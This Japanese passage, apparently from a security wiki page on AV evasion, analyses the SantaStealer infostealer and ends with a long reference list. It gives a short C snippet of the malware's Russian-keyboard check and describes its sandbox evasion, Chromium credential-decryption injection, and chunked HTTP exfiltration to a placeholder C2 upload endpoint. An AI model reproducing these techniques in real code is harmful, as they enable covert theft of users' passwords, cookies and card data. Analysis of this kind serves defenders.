SantaStealer（別名BluelineStealer）は、現代の情報窃取マルウェアが、AV bypass、anti-analysis、credential accessを単一のワークフローに組み合わせる手法を示しています。<sup>[[24]](#references)</sup>

### キーボードレイアウトによる判定とサンドボックス遅延

- 設定フラグ（`anti_cis`）は、`GetKeyboardLayoutList`を使ってインストール済みのキーボードレイアウトを列挙します。キリル文字のレイアウトが見つかると、サンプルは空の`CIS`マーカーを作成して終了します。これにより、対象外のロケールでは実行されない一方、ハンティング用の痕跡が残ります。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層化された `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前にカスタムの rolling checksum を適用して、デバッガーやサンドボックスの埋め込みブロックリストと照合します。コンピューター名にも同じ checksum を適用し、`C:\analysis` などの作業ディレクトリも確認します。
- Variant B はシステムプロパティ（プロセス数の下限、直近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、スリープ前後の時間を計測して single-stepping を検知します。いずれかの検査に該当すると、モジュールの起動前に処理を中断します。

### Fileless helper + 二重 ChaCha20 reflective loading

- メインの DLL/EXE には Chromium の credential helper が埋め込まれており、ディスクにドロップするか、メモリ内に手動でマッピングします。fileless モードでは helper が自ら import と relocation を解決するため、helper の痕跡は書き込まれません。
- この helper は、ChaCha20（32 バイトのキー 2 個 + 12 バイトの nonce 2 個）で二重に暗号化された第 2 段階の DLL を保持します。2 回の復号後、blob を reflective loading（`LoadLibrary` は不使用）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは direct-syscall reflective process hollowing を使って、実行中の Chromium ブラウザーに inject し、AppBound Encryption のキーを引き継ぎます。そして、ABE による強化を回避して、SQLite データベースからパスワード、cookie、クレジットカード情報を直接復号します。


### モジュール式のメモリ内収集と分割 HTTP exfil

- `create_memory_based_log` はグローバルな関数ポインタテーブル `memory_generators` を反復処理し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、ブラウザー拡張機能など）ごとにスレッドを 1 つ起動します。各スレッドは結果を共有バッファーに書き込み、約 45 秒の join 後にファイル数を報告します。
- 完了後、静的リンクされた `miniz` ライブラリを使って、すべてを `%TEMP%\\Log.zip` に zip 圧縮します。続いて `ThreadPayload1` は 15 秒スリープし、アーカイブを 10 MB のチャンクに分割して、HTTP POST で `http://<C2>:6767/upload` に送信します。ブラウザーの `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加されます。最後のチャンクには `complete: true` が付加され、C2 に再構成の完了を知らせます。

## References

- [1] [高度な Evasion Tradecraft：高精度な Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ブログ](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack：マルウェアにもう見逃しはない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – ドキュメント](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – サンプル](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – サンプル](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 自社の zero trust を信頼すべきか？Zscaler の posture check を回避する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去のランサムウェア活動を調査する](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：転送された Export の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – プロセスのセキュリティとアクセス権](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU リファレンス (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) の保護を活用した EDR 対策](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の保護を突破する](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンド リファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain の裏側：RAT から Builder、そして Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer がやってくる：新たな野心的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API tracing で Node.js マルウェアを無力化する](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations での Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を Kernel Operation Primitive として武器化する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo の補助コード](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った自己マスキング関数の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole のソース](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 関数](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - リダイレクトされた入力と出力を使った子プロセスの作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
